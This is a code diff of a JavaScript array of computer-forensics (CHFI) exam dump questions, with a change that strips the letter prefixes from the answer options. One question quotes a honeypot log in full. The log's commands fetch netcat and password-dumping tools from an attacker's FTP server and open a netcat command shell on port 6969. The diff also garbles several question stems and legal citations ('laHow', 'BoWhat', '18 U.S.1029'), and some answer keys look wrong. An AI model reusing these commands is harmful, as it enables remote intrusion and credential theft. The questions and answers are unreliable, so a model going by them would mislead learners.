@@ -7314,10 +7321,10 @@ export const CHFI_DUMP_QUESTIONS = [
     question:
       'The following excerpt is taken from a honeypot log that was hosted at lab.wiretrip.net. Snort reported Unicode attacks from 213.116.251.162. The File Permission Canonicalization vulnerability (UNICODE attack) allows scripts to be run in arbitrary folders that do not normally have the right to run scripts. The attacker tries a Unicode attack and eventually succeeds in displaying boot.ini. He then switches to playing with RDS, via msadcs.dll. The RDS vulnerability allows a malicious user to construct SQL statements that will execute shell commands (such as CMD.EXE) on the IIS server. He does a quick query to discover that the directory exists, and a query to msadcs.dll shows that it is functioning correctly. The attacker makes a RDS query which results in the commands run as shown below.\n"cmd1.exe /c open 213.116.251.162 >ftpcom"\n"cmd1.exe /c echo johna2k >>ftpcom"\n"cmd1.exe /c echo haxedj00 >>ftpcom"\n"cmd1.exe /c echo get nc.exe >>ftpcom"\n"cmd1.exe /c echo get pdump.exe >>ftpcom"\n"cmd1.exe /c echo get samdump.dll >>ftpcom"\n"cmd1.exe /c echo quit >>ftpcom"\n"cmd1.exe /c ftp -s:ftpcom"\n"cmd1.exe /c nc -l -p 6969 -e cmd1.exe"\nWhat can you infer from the exploit given?',
     options: [
-      "A. It is a local exploit where the attacker logs in using username johna2k",
-      "B. There are two attackers on the system - johna2k and haxedj00",
-      "C. The attack is a remote exploit and the hacker downloads three files",
-      "D. The attacker is unsuccessful in spawning a shell as he has specified a high end UDP port",
+      "It is a local exploit where the attacker logs in using username johna2k",
+      "There are two attackers on the system - johna2k and haxedj00",
+      "The attack is a remote exploit and the hacker downloads three files",
+      "The attacker is unsuccessful in spawning a shell as he has specified a high end UDP port",
     ],
     correctAnswer: 2,
   },
@@ -7326,10 +7333,10 @@ export const CHFI_DUMP_QUESTIONS = [
     question:
       "During the course of an investigation, you locate evidence that may prove the innocence of the suspect of the investigation. You must maintain an unbiased opinion and be objective in your entire fact finding process. Therefore you report this evidence. This type of evidence is known as:",
     options: [
-      "A. Inculpatory evidence",
-      "B. mandatory evidence",
-      "C. exculpatory evidence",
-      "D. Terrible evidence",
+      "Inculpatory evidence",
+      "mandatory evidence",
+      "exculpatory evidence",
+      "Terrible evidence",
     ],
     correctAnswer: 2,
   },
@@ -7337,13 +7344,13 @@ export const CHFI_DUMP_QUESTIONS = [
     id: 819,
     question:
       "If you discover a criminal act while investigating a corporate policy abuse, it becomes a public-sector investigation and should be referred to law enforcement?",
-    options: ["A. true", "B. false"],
+    options: ["true", "false"],
     correctAnswer: 0,
   },
   {
     id: 820,
     question: "What binary coding is used most often for e-mail purposes?",
-    options: ["A. MIME", "B. Uuencode", "C. IMAP", "D. SMTP"],
+    options: ["MIME", "Uuencode", "IMAP", "SMTP"],
     correctAnswer: 0,
   },
   {
@@ -7351,10 +7358,10 @@ export const CHFI_DUMP_QUESTIONS = [
     question:
       "If you see the files Zer0.tar.gz and copy.tar.gz on a Linux system while doing an investigation, what can you conclude?",
     options: [
-      "A. The system files have been copied by a remote attacker",
-      "B. The system administrator has created an incremental backup",
-      "C. The system has been compromised using a t0rnrootkit",
-      "D. Nothing in particular as these can be operational files",
+      "The system files have been copied by a remote attacker",
+      "The system administrator has created an incremental backup",
+      "The system has been compromised using a t0rnrootkit",
+      "Nothing in particular as these can be operational files",
     ],
     correctAnswer: 3,
   },
@@ -7362,58 +7369,48 @@ export const CHFI_DUMP_QUESTIONS = [
     id: 822,
     question:
       'From the following spam mail header, identify the host IP that sent this spam?\nFrom jie02@netvigator.com jie02@netvigator.com Tue Nov 27 17:27:11 2001\nReceived: from viruswall.ie.cuhk.edu.hk (viruswall [137.189.96.52]) by eng.ie.cuhk.edu.hk\n(8.11.6/8.11.6) with ESMTP id\nfAR9RAP23061 for ; Tue, 27 Nov 2001 17:27:10 +0800 (HKT)\nReceived: from mydomain.com (pcd249020.netvigator.com [203.218.39.20]) by\nviruswall.ie.cuhk.edu.hk (8.12.1/8.12.1)\nwith SMTP id fAR9QXwZ018431 for ; Tue, 27 Nov 2001 17:26:36 +0800 (HKT)\nMessage-Id: >200111270926.fAR9QXwZ018431@viruswall.ie.cuhk.edu.hk\nFrom: "china hotel web"\nTo: "Shlam"\nSubject: SHANGHAI (HILTON HOTEL) PACKAGE\nDate: Tue, 27 Nov 2001 17:25:58 +0800 MIME-Version: 1.0\nX-Priority: 3 X-MSMailPriority: Normal\nReply-To: "china hotel web"',
-    options: [
-      "A. 137.189.96.52",
-      "B. 8.12.1.0",
-      "C. 203.218.39.20",
-      "D. 203.218.39.50",
-    ],
+    options: ["137.189.96.52", "8.12.1.0", "203.218.39.20", "203.218.39.50"],
     correctAnswer: 2,
   },
   {
     id: 823,
     question:
       "If you plan to startup a suspect's computer, you must modify the ___________ to ensure that you do not contaminate or alter data on the suspect's hard drive by booting to the hard drive.",
-    options: [
-      "A. deltree command",
-      "B. CMOS",
-      "C. Boot.sys",
-      "D. Scandisk utility",
-    ],
+    options: ["deltree command", "CMOS", "Boot.sys", "Scandisk utility"],
     correctAnswer: 2,
   },
   {
     id: 824,
     question:
-      "You are working for a local police department that services a population of 1,000,000 people and you have been given the task of building a computer forensics lab. How many law-enforcement computer investigators should you request to staff the lab?",
-    options: ["A. 8", "B. 1", "C. 4", "D. 2"],
+      "You are working for a local police department that services a population of 1,000,000 people and you have been given the task of building a computer forensics laHow many law-enforcement computer investigators should you request to staff the lab?",
+    options: ["8", "1", "4", "2"],
     correctAnswer: 2,
   },
   {
     id: 825,
     question: "When obtaining a warrant it is important to:",
     options: [
-      "A. particularly describe the place to be searched and particularly describe the items to be seized",
-      "B. generally describe the place to be searched and particularly describe the items to be seized",
-      "C. generally describe the place to be searched and generally describe the items to be seized",
-      "D. particularly describe the place to be searched and generally describe the items to be seized",
+      "particularly describe the place to be searched and particularly describe the items to be seized",
+      "generally describe the place to be searched and particularly describe the items to be seized",
+      "generally describe the place to be searched and generally describe the items to be seized",
+      "particularly describe the place to be searched and generally describe the items to be seized",
     ],
     correctAnswer: 0,
   },
   {
     id: 828,
     question: "Sectors in hard disks typically contain how many bytes?",
-    options: ["A. 256", "B. 512", "C. 1024", "D. 2048"],
+    options: ["256", "512", "1024", "2048"],
     correctAnswer: 1,
   },
   {
     id: 829,
     question: "Area density refers to:",
     options: [
-      "A. the amount of data per disk",
-      "B. the amount of data per partition",
-      "C. the amount of data per square inch",
-      "D. the amount of data per platter",
+      "the amount of data per disk",
+      "the amount of data per partition",
+      "the amount of data per square inch",
+      "the amount of data per platter",
     ],
     correctAnswer: 0,
   },
@@ -7422,10 +7419,10 @@ export const CHFI_DUMP_QUESTIONS = [
     question:
       "Corporate investigations are typically easier than public investigations because:",
     options: [
-      "A. the users have standard corporate equipment and software",
-      "B. the investigator does not have to get a warrant",
-      "C. the investigator has to get a warrant",
-      "D. the users can load whatever they want on their machines",
+      "the users have standard corporate equipment and software",
+      "the investigator does not have to get a warrant",
+      "the investigator has to get a warrant",
+      "the users can load whatever they want on their machines",
     ],
     correctAnswer: 1,
   },
@@ -7433,12 +7430,7 @@ export const CHFI_DUMP_QUESTIONS = [
     id: 831,
     question:
       "Which of the following should a computer forensics lab used for investigations have?",
-    options: [
-      "A. isolation",
-      "B. restricted access",
-      "C. open access",
-      "D. an entry log",
-    ],
+    options: ["isolation", "restricted access", "open access", "an entry log"],
     correctAnswer: 1,
   },
   {
@@ -7446,10 +7438,10 @@ export const CHFI_DUMP_QUESTIONS = [
     question:
       "Jason is the security administrator of ACMA metal Corporation. One day he notices the company's Oracle database server has been compromised and the customer information along with financial data has been stolen. The financial loss will be in millions of dollars if the database gets into the hands of the competitors. Jason wants to report this crime to the law enforcement agencies immediately. Which organization coordinates computer crimes investigations throughout the United States?",
     options: [
-      "A. Internet Fraud Complaint Center",
-      "B. Local or national office of the U.S. Secret Service",
-      "C. National Infrastructure Protection Center",
-      "D. CERT Coordination Center",
+      "Internet Fraud Complaint Center",
+      "Local or national office of the U.S. Secret Service",
+      "National Infrastructure Protection Center",
+      "CERT Coordination Center",
     ],
     correctAnswer: 1,
   },
@@ -7458,10 +7450,10 @@ export const CHFI_DUMP_QUESTIONS = [
     question:
       "Which Intrusion Detection System (IDS) usually produces the most false alarms due to the unpredictable behaviors of users and networks?",
     options: [
-      "A. network-based IDS systems (NIDS)",
-      "B. host-based IDS systems (HIDS)",
-      "C. anomaly detection",
-      "D. signature recognition",
+      "network-based IDS systems (NIDS)",
+      "host-based IDS systems (HIDS)",
+      "anomaly detection",
+      "signature recognition",
     ],
     correctAnswer: 2,
   },
@@ -7470,10 +7462,10 @@ export const CHFI_DUMP_QUESTIONS = [
     question:
       "Why should you note all cable connections for a computer you want to seize as evidence?",
     options: [
-      "A. to know what outside connections existed",
-      "B. in case other devices were connected",
-      "C. to know what peripheral devices exist",
-      "D. to know what hardware existed",
+      "to know what outside connections existed",
+      "in case other devices were connected",
+      "to know what peripheral devices exist",
+      "to know what hardware existed",
     ],
     correctAnswer: 0,
   },
@@ -7482,29 +7474,24 @@ export const CHFI_DUMP_QUESTIONS = [
     question:
       "What method of computer forensics will allow you to trace all ever-established user accounts on a Windows 2000 server over the course of its lifetime?",
     options: [
-      "A. forensic duplication of hard drive",
-      "B. analysis of volatile data",
-      "C. comparison of MD5 checksums",
-      "D. review of SIDs in the Registry",
+      "forensic duplication of hard drive",
+      "analysis of volatile data",
+      "comparison of MD5 checksums",
+      "review of SIDs in the Registry",
     ],
     correctAnswer: 2,
   },
   {
     id: 838,
     question: "Which response organization tracks hoaxes as well as viruses?",
-    options: ["A. NIPC", "B. FEDCIRC", "C. CERT", "D. CIAC"],
+    options: ["NIPC", "FEDCIRC", "CERT", "CIAC"],
     correctAnswer: 3,
   },
   {
     id: 839,
     question:
       "Which federal computer crime law specifically refers to fraud and related activity in connection with access devices like routers?",
-    options: [
-      "A. 18 U.S.C. 1029",
-      "B. 18 U.S.C. 1362",
-      "C. 18 U.S.C. 2511",
-      "D. 18 U.S.C. 2703",
-    ],
+    options: ["18 U.S.1029", "18 U.S.1362", "18 U.S.2511", "18 U.S.2703"],
     correctAnswer: 0,
   },
   {
@@ -7512,23 +7499,23 @@ export const CHFI_DUMP_QUESTIONS = [
     question:
       "Office documents (Word, Excel, PowerPoint) contain a code that allows tracking the MAC, or unique identifier, of the machine that created the document. What is that code called?",
     options: [
-      "A. the Microsoft Virtual Machine Identifier",
-      "B. the Personal Application Protocol",
-      "C. the Globally Unique ID",
-      "D. the Individual ASCII String",
+      "the Microsoft Virtual Machine Identifier",
+      "the Personal Application Protocol",
+      "the Globally Unique ID",
+      "the Individual ASCII String",
     ],
     correctAnswer: 2,
   },
   {
     id: 841,
     question: "What TCP/UDP port does the toolkit program netstat use?",
-    options: ["A. Port 7", "B. Port 15", "C. Port 23", "D. Port 69"],
+    options: ["Port 7", "Port 15", "Port 23", "Port 69"],
     correctAnswer: 1,
   },
   {
     id: 843,
     question: "In a FAT32 system, a 123 KB file will use how many sectors?",
-    options: ["A. 34", "B. 25", "C. 11", "D. 56"],
+    options: ["34", "25", "11", "56"],
     correctAnswer: 1,
   },
   {
@@ -7536,17 +7523,17 @@ export const CHFI_DUMP_QUESTIONS = [
     question:
       "When performing a forensics analysis, what device is used to prevent the system from recording data on an evidence disk?",
     options: [
-      "A. a write-blocker",
-      "B. a protocol analyzer",
-      "C. a firewall",
-      "D. a disk editor",
+      "a write-blocker",
+      "a protocol analyzer",
+      "a firewall",
+      "a disk editor",
     ],
     correctAnswer: 0,
   },
   {
     id: 846,
     question: "How many sectors will a 125 KB file use in a FAT32 file system?",
-    options: ["A. 32", "B. 16", "C. 256", "D. 25"],
+    options: ["32", "16", "256", "25"],
     correctAnswer: 2,
   },
   {
@@ -7554,10 +7541,10 @@ export const CHFI_DUMP_QUESTIONS = [
     question:
       "You are called by an author who is writing a book and he wants to know how long the copyright for his book will last after he has the book published?",
     options: [
-      "A. 70 years",
-      "B. the life of the author",
-      "C. the life of the author plus 70 years",
-      "D. copyrights last forever",
+      "70 years",
+      "the life of the author",
+      "the life of the author plus 70 years",
+      "copyrights last forever",
     ],
     correctAnswer: 2,
   },
@@ -7566,22 +7553,22 @@ export const CHFI_DUMP_QUESTIONS = [
     question:
       "When investigating a network that uses DHCP to assign IP addresses, where would you look to determine which system (MAC address) had a specific IP address at a specific time?",
     options: [
-      "A. on the individual computer's ARP cache",
-      "B. in the Web Server log files",
-      "C. in the DHCP Server log files",
-      "D. there is no way to determine the specific IP address",
+      "on the individual computer's ARP cache",
+      "in the Web Server log files",
+      "in the DHCP Server log files",
+      "there is no way to determine the specific IP address",
     ],
     correctAnswer: 2,
   },
   {
     id: 849,
     question:
-      "Bob was caught using a remote production system illegally. The organization had used a Virtual Environment to trap Bob. What is a Virtual Environment?",
+      "Bob was caught using a remote production system illegally. The organization had used a Virtual Environment to trap BoWhat is a Virtual Environment?",
     options: [
-      "A. A Honeypot that traps hackers",
-      "B. A system Using Trojaned commands",
-      "C. An environment set up after the user logs in",
-      "D. An environment set up before an user logs in",
+      "A Honeypot that traps hackers",
+      "A system Using Trojaned commands",
+      "An environment set up after the user logs in",
+      "An environment set up before an user logs in",
     ],
     correctAnswer: 0,
   },
@@ -7590,10 +7577,10 @@ export const CHFI_DUMP_QUESTIONS = [
     question:
       "To make sure the evidence you recover and analyze with computer forensics software can be admitted in court, you must test and validate the software. What group is actively providing tools and creating procedures for testing and validating computer forensics software?",
     options: [
-      "A. Computer Forensics Tools and Validation Committee (CFTVC)",
-      "B. Association of Computer Forensics Software Manufactures (ACFSM)",
-      "C. National Institute of Standards and Technology (NIST)",
-      "D. Society for Valid Forensics Tools and Testing (SVFTT)",
+      "Computer Forensics Tools and Validation Committee (CFTVC)",
+      "Association of Computer Forensics Software Manufactures (ACFSM)",
+      "National Institute of Standards and Technology (NIST)",
+      "Society for Valid Forensics Tools and Testing (SVFTT)",
     ],
     correctAnswer: 2,
   },
@@ -7602,10 +7589,10 @@ export const CHFI_DUMP_QUESTIONS = [
     question:
       "With regard to using an Antivirus scanner during a computer forensics investigation, you should:",
     options: [
-      "A. Scan the suspect hard drive before beginning an investigation",
-      "B. Never run a scan on your forensics workstation because it could change your systems configuration",
-      "C. Scan your forensics workstation at intervals of no more than once every five minutes during an investigation",
-      "D. Scan your Forensics workstation before beginning an investigation",
+      "Scan the suspect hard drive before beginning an investigation",
+      "Never run a scan on your forensics workstation because it could change your systems configuration",
+      "Scan your forensics workstation at intervals of no more than once every five minutes during an investigation",
+      "Scan your Forensics workstation before beginning an investigation",
     ],
     correctAnswer: 3,
   },
@@ -7614,22 +7601,17 @@ export const CHFI_DUMP_QUESTIONS = [
     question:
       "You have used a newly released forensic investigation tool, which doesn't meet the Daubert Test, during a case. The case has ended-up in court. What argument could the defense make to weaken your case?",
     options: [
-      "A. The tool hasn't been tested by the International Standards Organization (ISO)",
-      "B. Only the local law enforcement should use the tool",
-      "C. The tool has not been reviewed and accepted by your peers",
-      "D. You are not certified for using the tool",
+      "The tool hasn't been tested by the International Standards Organization (ISO)",
+      "Only the local law enforcement should use the tool",
+      "The tool has not been reviewed and accepted by your peers",
+      "You are not certified for using the tool",
     ],
     correctAnswer: 2,
   },
   {
     id: 854,
     question: "Which of the following is NOT a graphics file?",
-    options: [
-      "A. Picture1.tga",
-      "B. Picture2.bmp",
-      "C. Picture3.nfo",
-      "D. Picture4.psd",
-    ],
+    options: ["Picture1.tga", "Picture2.bmp", "Picture3.nfo", "Picture4.psd"],
     correctAnswer: 2,
   },
   {
@@ -7637,10 +7619,10 @@ export const CHFI_DUMP_QUESTIONS = [
     question:
       "When conducting computer forensic analysis, you must guard against ______________ so that you remain focused on the primary job and ensure that the level of work does not increase beyond what was originally expected.",
     options: [
-      "A. Hard Drive Failure",
-      "B. Scope Creep",
-      "C. Unauthorized expenses",
-      "D. Overzealous marketing",
+      "Hard Drive Failure",
+      "Scope Creep",
+      "Unauthorized expenses",
+      "Overzealous marketing",
     ],
     correctAnswer: 1,
   },
@@ -7649,10 +7631,10 @@ export const CHFI_DUMP_QUESTIONS = [
     question:
       "In general, __________________ involves the investigation of data that can be retrieved from the hard disk or other disks of a computer by applying scientific methods to retrieve the data.",
     options: [
-      "A. Network Forensics",
-      "B. Data Recovery",
-      "C. Disaster Recovery",
-      "D. Computer Forensics",
+      "Network Forensics",
+      "Data Recovery",
+      "Disaster Recovery",
+      "Computer Forensics",
     ],
     correctAnswer: 3,
   },
@@ -7661,10 +7643,10 @@ export const CHFI_DUMP_QUESTIONS = [
     question:
       "When you carve an image, recovering the image depends on which of the following skills?",
     options: [
-      "A. Recognizing the pattern of the header content",
-      "B. Recovering the image from a tape backup",
-      "C. Recognizing the pattern of a corrupt file",
-      "D. Recovering the image from the tape backup",
+      "Recognizing the pattern of the header content",
+      "Recovering the image from a tape backup",
+      "Recognizing the pattern of a corrupt file",
+      "Recovering the image from the tape backup",
     ],
     correctAnswer: 0,
   },
@@ -7673,10 +7655,10 @@ export const CHFI_DUMP_QUESTIONS = [
     question:
       "When a file is deleted by Windows Explorer or through the MS-DOS delete command, the operating system inserts _______________ in the first letter position of the filename in the FAT database.",
     options: [
-      "A. A Capital X",
-      "B. A Blank Space",
-      "C. The Underscore Symbol",
-      "D. The lowercase Greek Letter Sigma (s)",
+      "A Capital X",
+      "A Blank Space",
+      "The Underscore Symbol",
+      "The lowercase Greek Letter Sigma (s)",
     ],
     correctAnswer: 3,
   },
@@ -7685,10 +7667,10 @@ export const CHFI_DUMP_QUESTIONS = [
     question:
       "While working for a prosecutor, what do you think you should do if the evidence you found appears to be exculpatory and is not being released to the defense?",
     options: [
-      "A. Keep the information on file for later review",
-      "B. Destroy the evidence",
-      "C. Bring the information to the attention of the prosecutor, his or her supervisor or finally to the judge",
-      "D. Present the evidence to the defense attorney",
+      "Keep the information on file for later review",
+      "Destroy the evidence",
+      "Bring the information to the attention of the prosecutor, his or her supervisor or finally to the judge",
+      "Present the evidence to the defense attorney",
     ],
     correctAnswer: 2,
   },
@@ -7697,10 +7679,10 @@ export const CHFI_DUMP_QUESTIONS = [
     question:
       "What type of file is represented by a colon (:) with a name following it in the Master File Table of an NTFS disk?",
     options: [
-      "A. A compressed file",
-      "B. A Data stream file",
-      "C. An encrypted file",
-      "D. A reserved file",
+      "A compressed file",
+      "A Data stream file",
+      "An encrypted file",
+      "A reserved file",
     ],
     correctAnswer: 1,
   },
@@ -7709,10 +7691,10 @@ export const CHFI_DUMP_QUESTIONS = [
     question:
       "An employee is suspected of stealing proprietary information stored on a computer using NTFS Encrypted File System (EFS). If the files were copied to a floppy disk, can the encryption be broken to verify possession?",
     options: [
-      "A. EFS uses a 128-bit key that can't be cracked, so you will not be able to recover the information",
-      "B. When the encrypted file was copied to the floppy disk, it was automatically unencrypted, so you can recover the information",
-      "C. The EFS Revoked Key Agent can be used on the Computer to recover the information",
-      "D. When the encrypted file was copied to the floppy disk, the EFS private key was also copied, so you can recover the information",
+      "EFS uses a 128-bit key that can't be cracked, so you will not be able to recover the information",
+      "When the encrypted file was copied to the floppy disk, it was automatically unencrypted, so you can recover the information",
+      "The EFS Revoked Key Agent can be used on the Computer to recover the information",
+      "When the encrypted file was copied to the floppy disk, the EFS private key was also copied, so you can recover the information",
     ],
     correctAnswer: 1,
   },
@@ -7720,7 +7702,7 @@ export const CHFI_DUMP_QUESTIONS = [
     id: 863,
     question:
       "When examining a hard disk without a write-blocker, you should not start Windows because Windows will write data to the:",
-    options: ["A. Recycle Bin", "B. MSDOS.sys", "C. BIOS", "D. Case files"],
+    options: ["Recycle Bin", "MSDOS.sys", "BIOS", "Case files"],
     correctAnswer: 0,
   },
   {
@@ -7728,18 +7710,18 @@ export const CHFI_DUMP_QUESTIONS = [
     question:
       "You are called in to assist the police in a case involving a password-protected floppy disk. What are two common methods used by password cracking software to obtain the password?",
     options: [
-      "A. Limited force and library attack",
-      "B. Brut Force and dictionary Attack",
-      "C. Maximum force and thesaurus Attack",
-      "D. Minimum force and appendix Attack",
+      "Limited force and library attack",
+      "Brut Force and dictionary Attack",
+      "Maximum force and thesaurus Attack",
+      "Minimum force and appendix Attack",
     ],
     correctAnswer: 1,
   },
   {
     id: 865,
     question:
-      "When reviewing web logs, you see an entry for 'resource not found' in the HTTP status code field. What is the actual error code you would see?",
-    options: ["A. 202", "B. 404", "C. 505", "D. 909"],
+      "When reviewing web logs, you see an entry for 'resource not found' in the HTTP status code fielWhat is the actual error code you would see?",
+    options: ["202", "404", "505", "909"],
     correctAnswer: 1,
   },
   {
@@ -7747,10 +7729,10 @@ export const CHFI_DUMP_QUESTIONS = [
     question:
       "Volatile memory is a challenge for forensic analysis because data may disappear on shutdown. In a lab, which option is most appropriate to help capture this data?",
     options: [
-      "A. Use VMware to be able to capture the data in memory and examine it",
-      "B. Give the Operating System a minimal amount of memory, forcing it to use a swap file",
-      "C. Create a separate partition of several hundred megabytes and place the swap file there",
-      "D. Use intrusion forensic techniques to study memory resident infections",
+      "Use VMware to be able to capture the data in memory and examine it",
+      "Give the Operating System a minimal amount of memory, forcing it to use a swap file",
+      "Create a separate partition of several hundred megabytes and place the swap file there",
+      "Use intrusion forensic techniques to study memory resident infections",
     ],
     correctAnswer: 2,
   },
@@ -7758,7 +7740,7 @@ export const CHFI_DUMP_QUESTIONS = [
     id: 867,
     question:
       "What port do you send a fake email to on the company SMTP server?",
-    options: ["A. 10", "B. 25", "C. 110", "D. 135"],
+    options: ["10", "25", "110", "135"],
     correctAnswer: 1,
   },
   {
@@ -7766,10 +7748,10 @@ export const CHFI_DUMP_QUESTIONS = [
     question:
       "This is the original file structure database that Microsoft designed for floppy disks. It is written to the outermost track of a disk and contains information about each file stored on the drive.",
     options: [
-      "A. Master Boot Record (MBR)",
-      "B. Master File Table (MFT)",
-      "C. File Allocation Table (FAT)",
-      "D. Disk Operating System (DOS)",
+      "Master Boot Record (MBR)",
+      "Master File Table (MFT)",
+      "File Allocation Table (FAT)",
+      "Disk Operating System (DOS)",
     ],
     correctAnswer: 2,
   },
@@ -7778,10 +7760,10 @@ export const CHFI_DUMP_QUESTIONS = [
     question:
       "What should you do when approached by a reporter about a case you are working on or have worked on?",
     options: [
-      "A. Refer the reporter to the attorney that retained you",
-      'B. Say, "no comment"',
-      "C. Answer all the reporter's questions as completely as possible",
-      "D. Answer only the questions that help your case",
+      "Refer the reporter to the attorney that retained you",
+      'Say, "no comment"',
+      "Answer all the reporter's questions as completely as possible",
+      "Answer only the questions that help your case",
     ],
     correctAnswer: 0,
   },
@@ -7790,10 +7772,10 @@ export const CHFI_DUMP_QUESTIONS = [
     question:
       "Where did the incident response team go wrong in the case of the erased servers and zip disk?",
     options: [
-      "A. They examined the actual evidence on an unrelated system",
-      "B. They attempted to implicate personnel without proof",
-      "C. They tampered with evidence by using it",
-      "D. They called in the FBI without correlating with the fingerprint data",
+      "They examined the actual evidence on an unrelated system",
+      "They attempted to implicate personnel without proof",
+      "They tampered with evidence by using it",
+      "They called in the FBI without correlating with the fingerprint data",
     ],
     correctAnswer: 2,
   },
@@ -7802,10 +7784,10 @@ export const CHFI_DUMP_QUESTIONS = [
     question:
       "Why is it important to view the contents of the page or swap file when investigating a Windows System?",
     options: [
-      "A. Windows stores all of the system's configuration information in this file",
-      "B. This is the file that Windows uses to communicate directly with the Registry",
-      "C. A large volume of data can exist within the swap file of which the computer user has no knowledge",
-      "D. This is the file that Windows uses to store the history of the last 100 commands run from the command line",
+      "Windows stores all of the system's configuration information in this file",
+      "This is the file that Windows uses to communicate directly with the Registry",
+      "A large volume of data can exist within the swap file of which the computer user has no knowledge",
+      "This is the file that Windows uses to store the history of the last 100 commands run from the command line",
     ],
     correctAnswer: 2,
   },
@@ -7814,10 +7796,10 @@ export const CHFI_DUMP_QUESTIONS = [
     question:
       "What is the correct sequence of events after securing the scene and shutting down the system during a hacking incident investigation?",
     options: [
-      "A. Connect the target media; prepare the system for acquisition; Secure the evidence; Copy the media",
-      "B. Prepare the system for acquisition; Connect the target media; Copy the media; Secure the evidence",
-      "C. Connect the target media; Prepare the system for acquisition; Secure the evidence; Copy the media",
-      "D. Secure the evidence; Prepare the system for acquisition; Connect the target media; Copy the media",
+      "Connect the target media; prepare the system for acquisition; Secure the evidence; Copy the media",
+      "Prepare the system for acquisition; Connect the target media; Copy the media; Secure the evidence",
+      "Connect the target media; Prepare the system for acquisition; Secure the evidence; Copy the media",
+      "Secure the evidence; Prepare the system for acquisition; Connect the target media; Copy the media",
     ],
     correctAnswer: 1,
   },
@@ -7826,10 +7808,10 @@ export const CHFI_DUMP_QUESTIONS = [
     question:
       "What does the use of warning banners help a company avoid by overcoming an employee’s assumed right?",
     options: [
-      "A. Right to work",
-      "B. Right of free speech",
-      "C. Right to Internet Access",
-      "D. Right of Privacy",
+      "Right to work",
+      "Right of free speech",
+      "Right to Internet Access",
+      "Right of Privacy",
     ],
     correctAnswer: 3,
   },
@@ -7837,10 +7819,10 @@ export const CHFI_DUMP_QUESTIONS = [
     id: 875,
     question: "What does mactime, a part of the Coroner’s Toolkit, do?",
     options: [
-      "A. It traverses the file system and produces a listing of all files based on the modification, access and change timestamps",
-      "B. It can recover deleted file space and search it for data, but does not allow preview",
-      "C. The tool scans for i-node information, which is used by other tools in the toolkit",
-      "D. It is a tool specific to the MAC OS and forms a core component of the toolkit",
+      "It traverses the file system and produces a listing of all files based on the modification, access and change timestamps",
+      "It can recover deleted file space and search it for data, but does not allow preview",
+      "The tool scans for i-node information, which is used by other tools in the toolkit",
+      "It is a tool specific to the MAC OS and forms a core component of the toolkit",
     ],
     correctAnswer: 0,
   },
@@ -7849,10 +7831,10 @@ export const CHFI_DUMP_QUESTIONS = [
     question:
       "One way to identify the presence of hidden partitions on a suspect's hard drive is to:",
     options: [
-      "A. Add up the total size of all known partitions and compare it to the total size of the hard drive",
-      "B. Examine the FAT and identify hidden partitions by noting an H in the partition Type field",
-      "C. Examine the LILO and note an H in the partition Type field",
-      "D. It is not possible to have hidden partitions on a hard drive",
+      "Add up the total size of all known partitions and compare it to the total size of the hard drive",
+      "Examine the FAT and identify hidden partitions by noting an H in the partition Type field",
+      "Examine the LILO and note an H in the partition Type field",
+      "It is not possible to have hidden partitions on a hard drive",
     ],
     correctAnswer: 0,
   },
@@ -7861,10 +7843,10 @@ export const CHFI_DUMP_QUESTIONS = [
     question:
       "What information do you need to recover when searching a victim's computer for a crime committed with a specific email message?",
     options: [
-      "A. Internet service provider information",
-      "B. E-mail header",
-      "C. Username and password",
-      "D. Firewall log",
+      "Internet service provider information",
+      "E-mail header",
+      "Username and password",
+      "Firewall log",
     ],
     correctAnswer: 1,
   },
@@ -7873,10 +7855,10 @@ export const CHFI_DUMP_QUESTIONS = [
     question:
       "What would be the primary reason to recommend a disk imaging tool instead of a simple DOS copy of files?",
     options: [
-      "A. A disk imaging tool would check for CRC32s for internal self-checking and validation and have MD5 checksum",
-      "B. Evidence file format will contain case data entered by the examiner and encrypted at the beginning of the evidence file",
-      "C. A simple DOS copy will not include deleted files, file slack, and other information",
-      "D. There is no case for an imaging tool as it will use a closed, proprietary format that if compared to the original will not match up sector for sector",
+      "A disk imaging tool would check for CRC32s for internal self-checking and validation and have MD5 checksum",
+      "Evidence file format will contain case data entered by the examiner and encrypted at the beginning of the evidence file",
+      "A simple DOS copy will not include deleted files, file slack, and other information",
+      "There is no case for an imaging tool as it will use a closed, proprietary format that if compared to the original will not match up sector for sector",
     ],
     correctAnswer: 2,
   },
@@ -7885,10 +7867,10 @@ export const CHFI_DUMP_QUESTIONS = [
     question:
       "What prevents you from discussing a case with the CEO when employed directly by an attorney?",
     options: [
-      "A. The attorney-work-product rule",
-      "B. Good manners",
-      "C. Trade secrets",
-      "D. ISO 17799",
+      "The attorney-work-product rule",
+      "Good manners",
+      "Trade secrets",
+      "ISO 17799",
     ],
     correctAnswer: 0,
   },
@@ -7897,10 +7879,10 @@ export const CHFI_DUMP_QUESTIONS = [
     question:
       "What can an investigator examine to verify that a file has the correct extension?",
     options: [
-      "A. The File Allocation Table",
-      "B. The file header",
-      "C. The file footer",
-      "D. The sector map",
+      "The File Allocation Table",
+      "The file header",
+      "The file footer",
+      "The sector map",
     ],
     correctAnswer: 1,
   },
@@ -7909,10 +7891,10 @@ export const CHFI_DUMP_QUESTIONS = [
     question:
       "Which organization maintains a database of hash signatures for known software?",
     options: [
-      "A. International Standards Organization",
-      "B. Institute of Electrical and Electronics Engineers",
-      "C. National Software Reference Library",
-      "D. American National Standards Institute",
+      "International Standards Organization",
+      "Institute of Electrical and Electronics Engineers",
+      "National Software Reference Library",
+      "American National Standards Institute",
     ],
     correctAnswer: 2,
   },
@@ -7921,10 +7903,10 @@ export const CHFI_DUMP_QUESTIONS = [
     question:
       "The ____________________ refers to handing over the results of private investigations to the authorities because of indications of criminal activity.",
     options: [
-      "A. Locard Exchange Principle",
-      "B. Clark Standard",
-      "C. Kelly Policy",
-      "D. Silver-Platter Doctrine",
+      "Locard Exchange Principle",
+      "Clark Standard",
+      "Kelly Policy",
+      "Silver-Platter Doctrine",
     ],
     correctAnswer: 3,
   },
@@ -7933,10 +7915,10 @@ export const CHFI_DUMP_QUESTIONS = [
     question:
       "What should you do if an employer has no policy reserving the right to inspect computing assets?",
     options: [
-      "A. Inform the owner that conducting an investigation without a policy is not a problem because the company is privately owned",
-      "B. Inform the owner that conducting an investigation without a policy is a violation of the 4th amendment",
-      "C. Inform the owner that conducting an investigation without a policy is a violation of the employee's expectation of privacy",
-      "D. Inform the owner that conducting an investigation without a policy is not a problem because a policy is only necessary for government agencies",
+      "Inform the owner that conducting an investigation without a policy is not a problem because the company is privately owned",
+      "Inform the owner that conducting an investigation without a policy is a violation of the 4th amendment",
+      "Inform the owner that conducting an investigation without a policy is a violation of the employee's expectation of privacy",
